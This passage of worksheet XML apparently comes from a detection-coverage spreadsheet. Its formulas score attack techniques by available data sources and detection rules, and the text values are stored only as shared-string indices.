        <f t="array" ref="M320">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N320" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O320" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P320" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S32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20" t="s">
        <v>485</v>
      </c>
      <c r="U320" t="s">
        <v>1635</v>
      </c>
      <c r="V320" t="s">
        <v>1636</v>
      </c>
      <c r="W320" t="b">
        <v>1</v>
      </c>
      <c r="X320" t="s">
        <v>1617</v>
      </c>
    </row>
    <row r="321" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A321" t="s">
        <v>1637</v>
      </c>
      <c r="B321" t="s">
        <v>1637</v>
      </c>
      <c r="C321" t="s">
        <v>180</v>
      </c>
      <c r="D321" t="s">
        <v>4</v>
      </c>
      <c r="E321" t="s">
        <v>1638</v>
      </c>
      <c r="F321" s="9">
        <f t="shared" si="4"/>
        <v>6</v>
      </c>
      <c r="G321" s="9" cm="1">
        <f t="array" ref="G321">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H321" s="9" cm="1">
        <f t="array" ref="H321">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>5</v>
      </c>
      <c r="I321" s="9" t="str" cm="1">
        <f t="array" ref="I321">IF(SUM(IF($C321=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C321=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J321" s="9" cm="1">
        <f t="array" ref="J32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321" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>5</v>
      </c>
      <c r="M321" s="9" cm="1">
        <f t="array" ref="M321">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>5</v>
      </c>
      <c r="N321" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O321" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P321" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S32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21" t="s">
        <v>425</v>
      </c>
      <c r="U321" t="s">
        <v>1639</v>
      </c>
      <c r="V321" t="s">
        <v>1640</v>
      </c>
      <c r="W321" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="322" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A322" t="s">
        <v>1637</v>
      </c>
      <c r="B322" t="s">
        <v>1641</v>
      </c>
      <c r="C322" t="s">
        <v>1642</v>
      </c>
      <c r="D322" t="s">
        <v>4</v>
      </c>
      <c r="E322" t="s">
        <v>549</v>
      </c>
      <c r="F322" s="9">
        <f t="shared" ref="F322:F385" si="5">LEN(E322)-LEN(SUBSTITUTE(E322,",",""))+1</f>
        <v>1</v>
      </c>
      <c r="G322" s="9" cm="1">
        <f t="array" ref="G322">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H322" s="9" t="str" cm="1">
        <f t="array" ref="H322">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I322" s="9" t="str" cm="1">
        <f t="array" ref="I322">IF(SUM(IF($C322=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C322=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J322" s="9" t="str" cm="1">
        <f t="array" ref="J32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22" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M322" s="9" cm="1">
        <f t="array" ref="M322">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N322" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O322" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P322" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S32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22" t="s">
        <v>407</v>
      </c>
      <c r="U322" t="s">
        <v>1643</v>
      </c>
      <c r="V322" t="s">
        <v>1644</v>
      </c>
      <c r="W322" t="b">
        <v>1</v>
      </c>
      <c r="X322" t="s">
        <v>1637</v>
      </c>
    </row>
    <row r="323" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A323" t="s">
        <v>1637</v>
      </c>
      <c r="B323" t="s">
        <v>1645</v>
      </c>
      <c r="C323" t="s">
        <v>1646</v>
      </c>
      <c r="D323" t="s">
        <v>4</v>
      </c>
      <c r="E323" t="s">
        <v>1647</v>
      </c>
      <c r="F323" s="9">
        <f t="shared" si="5"/>
        <v>2</v>
      </c>
      <c r="G323" s="9" cm="1">
        <f t="array" ref="G323">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H323" s="9" t="str" cm="1">
        <f t="array" ref="H323">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I323" s="9" t="str" cm="1">
        <f t="array" ref="I323">IF(SUM(IF($C323=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C323=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J323" s="9" t="str" cm="1">
        <f t="array" ref="J32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23" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M323" s="9" cm="1">
        <f t="array" ref="M323">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N323" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O323" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P323" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S32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23" t="s">
        <v>407</v>
      </c>
      <c r="U323" t="s">
        <v>1648</v>
      </c>
      <c r="V323" t="s">
        <v>1649</v>
      </c>
      <c r="W323" t="b">
        <v>1</v>
      </c>
      <c r="X323" t="s">
        <v>1637</v>
      </c>
    </row>
    <row r="324" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A324" t="s">
        <v>1637</v>
      </c>
      <c r="B324" t="s">
        <v>1650</v>
      </c>
      <c r="C324" t="s">
        <v>1651</v>
      </c>
      <c r="D324" t="s">
        <v>4</v>
      </c>
      <c r="E324" t="s">
        <v>1638</v>
      </c>
      <c r="F324" s="9">
        <f t="shared" si="5"/>
        <v>6</v>
      </c>
      <c r="G324" s="9" cm="1">
        <f t="array" ref="G324">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H324" s="9" t="str" cm="1">
        <f t="array" ref="H324">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I324" s="9" t="str" cm="1">
        <f t="array" ref="I324">IF(SUM(IF($C324=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C324=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J324" s="9" t="str" cm="1">
        <f t="array" ref="J32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24" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M324" s="9" cm="1">
        <f t="array" ref="M324">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N324" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O324" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P324" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S32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24" t="s">
        <v>425</v>
      </c>
      <c r="U324" t="s">
        <v>1652</v>
      </c>
      <c r="V324" t="s">
        <v>1653</v>
      </c>
      <c r="W324" t="b">
        <v>1</v>
      </c>
      <c r="X324" t="s">
        <v>1637</v>
      </c>
    </row>
    <row r="325" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A325" t="s">
        <v>1637</v>
      </c>
      <c r="B325" t="s">
        <v>1654</v>
      </c>
      <c r="C325" t="s">
        <v>1655</v>
      </c>
      <c r="D325" t="s">
        <v>4</v>
      </c>
      <c r="E325" t="s">
        <v>1656</v>
      </c>
      <c r="F325" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G325" s="9" cm="1">
        <f t="array" ref="G325">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H325" s="9" t="str" cm="1">
        <f t="array" ref="H325">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I325" s="9" t="str" cm="1">
        <f t="array" ref="I325">IF(SUM(IF($C325=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C325=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J325" s="9" t="str" cm="1">
        <f t="array" ref="J32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25" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M325" s="9" cm="1">
        <f t="array" ref="M325">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N325" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O325" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P325" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S32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25" t="s">
        <v>386</v>
      </c>
      <c r="U325" t="s">
        <v>1657</v>
      </c>
      <c r="V325" t="s">
        <v>1658</v>
      </c>
      <c r="W325" t="b">
        <v>1</v>
      </c>
      <c r="X325" t="s">
        <v>1637</v>
      </c>
    </row>
    <row r="326" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A326" t="s">
        <v>1637</v>
      </c>
      <c r="B326" t="s">
        <v>1659</v>
      </c>
      <c r="C326" t="s">
        <v>1660</v>
      </c>
      <c r="D326" t="s">
        <v>4</v>
      </c>
      <c r="E326" t="s">
        <v>1661</v>
      </c>
      <c r="F326" s="9">
        <f t="shared" si="5"/>
        <v>5</v>
      </c>
      <c r="G326" s="9" cm="1">
        <f t="array" ref="G326">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H326" s="9" t="str" cm="1">
        <f t="array" ref="H326">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I326" s="9" t="str" cm="1">
        <f t="array" ref="I326">IF(SUM(IF($C326=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C326=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J326" s="9" t="str" cm="1">
        <f t="array" ref="J32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26" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M326" s="9" cm="1">
        <f t="array" ref="M326">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N326" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O326" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P326" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S32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26" t="s">
        <v>386</v>
      </c>
      <c r="U326" t="s">
        <v>1662</v>
      </c>
      <c r="V326" t="s">
        <v>1663</v>
      </c>
      <c r="W326" t="b">
        <v>1</v>
      </c>
      <c r="X326" t="s">
        <v>1637</v>
      </c>
    </row>
    <row r="327" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A327" t="s">
        <v>1664</v>
      </c>
      <c r="B327" t="s">
        <v>1664</v>
      </c>
      <c r="C327" t="s">
        <v>194</v>
      </c>
      <c r="D327" t="s">
        <v>8</v>
      </c>
      <c r="E327" t="s">
        <v>1665</v>
      </c>
      <c r="F327" s="9">
        <f t="shared" si="5"/>
        <v>5</v>
      </c>
      <c r="G327" s="9" cm="1">
        <f t="array" ref="G327">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H327" s="9" cm="1">
        <f t="array" ref="H327">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>1</v>
      </c>
      <c r="I327" s="9" t="str" cm="1">
        <f t="array" ref="I327">IF(SUM(IF($C327=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C327=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J327" s="9" cm="1">
        <f t="array" ref="J32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327" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M327" s="9" cm="1">
        <f t="array" ref="M327">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N327" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O327" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P327" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S32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27" t="s">
        <v>485</v>
      </c>
      <c r="U327" t="s">
        <v>1666</v>
      </c>
      <c r="V327" t="s">
        <v>1667</v>
      </c>
      <c r="W327" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="328" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A328" t="s">
        <v>1664</v>
      </c>
      <c r="B328" t="s">
        <v>1668</v>
      </c>
      <c r="C328" t="s">
        <v>266</v>
      </c>
      <c r="D328" t="s">
        <v>8</v>
      </c>
      <c r="E328" t="s">
        <v>1665</v>
      </c>
      <c r="F328" s="9">
        <f t="shared" si="5"/>
        <v>5</v>
      </c>
      <c r="G328" s="9" cm="1">
        <f t="array" ref="G328">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H328" s="9" t="str" cm="1">
        <f t="array" ref="H328">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I328" s="9" t="str" cm="1">
        <f t="array" ref="I328">IF(SUM(IF($C328=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C328=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J328" s="9" t="str" cm="1">
        <f t="array" ref="J32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28" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M328" s="9" cm="1">
        <f t="array" ref="M328">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N328" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O328" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P328" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S32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28" t="s">
        <v>485</v>
      </c>
      <c r="U328" t="s">
        <v>1669</v>
      </c>
      <c r="V328" t="s">
        <v>1670</v>
      </c>
      <c r="W328" t="b">
        <v>1</v>
      </c>
      <c r="X328" t="s">
        <v>1664</v>
      </c>
    </row>
    <row r="329" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A329" t="s">
        <v>1671</v>
      </c>
      <c r="B329" t="s">
        <v>1671</v>
      </c>
      <c r="C329" t="s">
        <v>143</v>
      </c>
      <c r="D329" t="s">
        <v>4</v>
      </c>
      <c r="E329" t="s">
        <v>1672</v>
      </c>
      <c r="F329" s="9">
        <f t="shared" si="5"/>
        <v>3</v>
      </c>
      <c r="G329" s="9" cm="1">
        <f t="array" ref="G329">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H329" s="9" cm="1">
        <f t="array" ref="H329">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I329" s="9" t="str" cm="1">
        <f t="array" ref="I329">IF(SUM(IF($C329=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C329=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J329" s="9" t="str" cm="1">
        <f t="array" ref="J32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29" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M329" s="9" cm="1">
        <f t="array" ref="M329">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N329" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O329" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P329" s="14" t="str">
